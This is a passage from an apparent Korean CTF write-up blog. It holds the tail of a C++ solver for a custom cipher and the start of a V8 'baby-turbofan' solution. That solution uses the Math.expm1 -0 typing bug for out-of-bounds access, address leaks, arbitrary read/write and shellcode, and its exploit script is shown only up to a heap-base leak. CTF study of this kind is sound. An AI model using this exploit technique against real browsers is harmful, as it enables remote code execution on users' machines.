<span class="mh">0xD6</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0xED</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">,</span> <span class="mh">0x3D</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1A</span><span class="p">,</span> <span class="mh">0xAF</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">inv_sbox</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">rol</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">){</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">ror</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">n</span><span class="p">){</span>
    <span class="k">return</span> <span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">sub</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">sbox</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">shift_row</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=</span><span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">enc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">+=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">xr</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[],</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">b</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_enc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">t</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">t</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">ror</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&amp;</span><span class="mi">7</span><span class="p">);</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">-=</span> <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]]</span> <span class="o">&amp;=</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="mi">15</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">^=</span> <span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">|</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_shift_row</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">];</span>
        <span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">12</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
        <span class="n">a</span><span class="p">[(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span><span class="o">%</span><span class="mi">16</span><span class="p">]</span><span class="o">=</span><span class="n">d</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">inv_sub</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a</span><span class="p">[]){</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">inv_sbox</span><span class="p">[</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="c1">// unsigned int a[]= {154, 93, 38, 210, 111, 102, 0, 197, 218, 246, 231, 246, 205, 56, 1, 249};</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a</span><span class="o">=</span> <span class="n">comp</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">inv_sbox</span><span class="p">[</span><span class="n">sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="o">=</span><span class="n">i</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">_</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">_</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">_</span><span class="o">++</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xC0FF33</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">sub</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">enc</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xC0FF33</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">inv_enc</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">inv_shift_row</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>
            <span class="n">inv_sub</span><span class="p">(</span><span class="n">x</span><span class="p">);</span>

            <span class="n">xr</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>

            <span class="n">inv_enc</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
            <span class="n">inv_shift_row</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
            <span class="n">inv_sub</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">a</span> <span class="o">+=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><h2 id="k-baby-turbofan---pwnable">K. baby-turbofan - Pwnable<a href="#k-baby-turbofan---pwnable" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>처음으로 풀어본 V8 문제이다.</p><p>문제의 디스크립션에서 언급되는 <code class="language-plaintext highlighter-rouge">Krautflare</code>는 약간 예전 PlaidCTF의 <code class="language-plaintext highlighter-rouge">ropasaurusrex</code> 정도의 감성으로 자주 언급되는 입문용 문제인 것 같아보였다.<br /> 해당 문제에서는 위와 동일한 취약점을 갖고 있었지만, <code class="language-plaintext highlighter-rouge">pointer compression</code>이 적용된 버전이라는 차이가 존재하였다.</p><p>V8에 대한 지식이 전무했으므로 다른 문제의 exploit을 짜집기해서 디버깅하는 방식으로 방향을 정하였고<br /> 지금은 카이스트생인 고등학교 후배의 블로그 글을 많이 참고하여 풀이하였다.<br /> 특히 <a href="https://sunrinjuntae.tistory.com/171">35C3-Krautflare</a>와 <a href="https://sunrinjuntae.tistory.com/172">DownUnder-Is this pwn or web?</a>을 주로 참고하였다.</p><p>위 글에 적혀있는 자세한 취약점 설명은 생략하고 내가 풀이했던 방법은 아래와 같다.</p><ol><li><code class="language-plaintext highlighter-rouge">Object.is(-0, -0) * index</code>를 이용하여 OOB 발생<li>OOB를 통해 힙 포인터 베이스 LEAK<li>객체 리스트에 값을 넣고 OOB를 이용해 객체의 주소 LEAK<li>동적디버깅을 이용하여 알아낸 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>의 <code class="language-plaintext highlighter-rouge">backing store</code>위치를 OOB를 통해 접근하여 aar, aaw<li>쉘코드 실행</ol><p>정리하면 제목의 baby가 무색하지 않을 상당히 간단한 문제였지만<br /> 이해하고, 오프셋을 구하기 위해 객체들을 붙이고, 구현하는 데에 참 많은 시간이 들었다.</p><p>무언가 하나 크게 얻어간 문제였던 것 같다.</p><blockquote><p>Exploit Script</p></blockquote><div class="language-js highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">print</span> <span class="o">=</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span>

<span class="kd">var</span> <span class="nx">tmp_obj</span> <span class="o">=</span> <span class="p">{</span><span class="na">X</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span>

<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
   <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
   <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
   <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">val</span><span class="p">){</span>
   <span class="k">return</span> <span class="dl">"</span><span class="s2">0x</span><span class="dl">"</span><span class="o">+</span><span class="nx">val</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">oob</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">,</span> <span class="nx">oo</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">,</span> <span class="nx">arb</span> <span class="o">=</span> <span class="kc">undefined</span>
<span class="kd">function</span> <span class="nx">foo</span><span class="p">(</span><span class="nx">x</span><span class="p">){</span>
   <span class="kd">let</span> <span class="nx">aux</span> <span class="o">=</span> <span class="p">{</span><span class="na">mz</span><span class="p">:</span><span class="o">-</span><span class="mi">0</span><span class="p">};</span>
   <span class="kd">let</span> <span class="nx">idx</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">is</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">expm1</span><span class="p">(</span><span class="nx">x</span><span class="p">),</span> <span class="nx">aux</span><span class="p">.</span><span class="nx">mz</span><span class="p">);</span>
   <span class="kd">let</span> <span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="mf">0.1</span><span class="p">,</span><span class="mf">0.2</span><span class="p">,</span><span class="mf">0.3</span><span class="p">,</span><span class="mf">0.4</span><span class="p">,</span><span class="mf">0.5</span><span class="p">];</span>
   <span class="kd">let</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">BigUint64Array</span><span class="p">([</span>
      <span class="mh">0x1111111111111111</span><span class="nx">n</span><span class="p">,</span>
      <span class="mh">0x2222222222222222</span><span class="nx">n</span><span class="p">,</span>
      <span class="mh">0x3333333333333333</span><span class="nx">n</span><span class="p">,</span>
   <span class="p">]);</span>

   <span class="kd">let</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[</span><span class="nx">tmp_obj</span><span class="p">,</span> <span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">]</span>
   <span class="kd">let</span> <span class="nx">aaaa</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mh">0x1338</span><span class="p">);</span>


   <span class="nx">oob</span> <span class="o">=</span> <span class="nx">b</span>
   <span class="nx">oo</span> <span class="o">=</span> <span class="nx">c</span>
   <span class="nx">arb</span> <span class="o">=</span> <span class="nx">aaaa</span>

   <span class="nx">idx</span> <span class="o">*=</span> <span class="mi">25</span><span class="p">;</span>
   <span class="nx">a</span><span class="p">[</span><span class="nx">idx</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0xFFFFFFFF000023e8</span><span class="nx">n</span><span class="p">)</span>
   <span class="k">return</span> <span class="nx">a</span><span class="p">[</span><span class="nx">idx</span><span class="p">];</span>
<span class="p">}</span>

<span class="nx">foo</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">100000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">foo</span><span class="p">(</span><span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">foo</span><span class="p">(</span><span class="o">-</span><span class="mi">0</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">base</span> <span class="o">=</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">oob</span><span class="p">[</span><span class="mi">9</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span><span class="nx">n</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span>
